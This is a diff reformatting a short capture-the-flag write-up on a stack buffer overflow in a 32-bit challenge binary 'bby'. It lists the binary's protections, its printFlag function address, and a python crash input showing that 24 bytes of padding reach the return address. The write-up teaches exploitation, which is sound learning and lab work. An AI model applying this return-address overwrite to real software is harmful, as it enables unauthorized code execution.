@@ -1,21 +1,18 @@
 0x0 Introduction
 =
 
-`bby: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=3fb9014d549efe4ce761146b736590eb9f7e281d, not stripped
-`
+```
+bby: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=3fb9014d549efe4ce761146b736590eb9f7e281d, not stripped
+```
 
 This file is ELF 32bit execution.
-
+```
 	CANARY    : disabled
-
 	FORTIFY   : disabled
-
 	NX        : ENABLED
-
-	PIE       : disabled
-	
+	PIE       : disabled	
 	RELRO     : Partial
-
+```
 It have those protect.
 
 `0804856d <printFlag>:`
@@ -24,7 +21,7 @@ And there hava a function call printFlag.If I can controller eip and jump to thi
 
 0x1 Vulnerability
 =
-
+```
 	# python -c "print 'a'*24+'zzzz'"|ltrace -i ./bby 
 
 	[0x8048491] __libc_start_main(0x80485c9, 1, 0xffb97214, 0x8048610 <unfinished ...>
@@ -38,5 +35,5 @@ And there hava a function call printFlag.If I can controller eip and jump to thi
 	[0x7a7a7a7a] --- SIGSEGV (Segmentation fault) ---
 
 	[0xffffffffffffffff] +++ killed by SIGSEGV +++
-
+```
 It's easy to exploit,When input padding 24bytes,Next 4 bytes will be return address.
